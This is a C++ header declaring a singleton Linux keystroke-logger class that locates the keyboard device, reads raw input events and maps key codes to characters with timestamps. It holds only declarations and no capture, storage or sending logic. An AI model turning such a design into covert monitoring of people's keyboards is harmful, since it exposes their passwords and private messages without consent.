m // logger.h

#ifndef logger_h
#define logger_h

#include "eventstruct.h"

#include <linux/input.h>
#include <unordered_map>

#include <iostream>
#include <string>
#include <thread>

class logger {
public:
	static logger& get_instance();

	logger(logger const&)            = delete;
	logger& operator=(logger const&) = delete;

	auto init(std::string const& event_ID = "") -> bool;
	auto check_init() const -> bool;

	auto start() -> void;
	auto kill() -> void;

private:
	logger();
	~logger();

	int                                                                         fd_;
	bool                                                                        initialized_;
	bool                                                                        running_;
	std::string                                                                 ev_init_;
	const std::unordered_map<unsigned int, std::pair<std::string, std::string>> keymap_;

	static auto
	load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>>;
	auto fd_monitor(signed int fd, fd_set fds) -> signed int;
	auto datetime(time_t tv_sec) -> std::pair<std::string, std::string>;

	auto find_kbd() -> std::string;
	auto ev_reader() -> void;
	auto get_keychar(unsigned int code) -> std::string;
};

#endif // logger_h
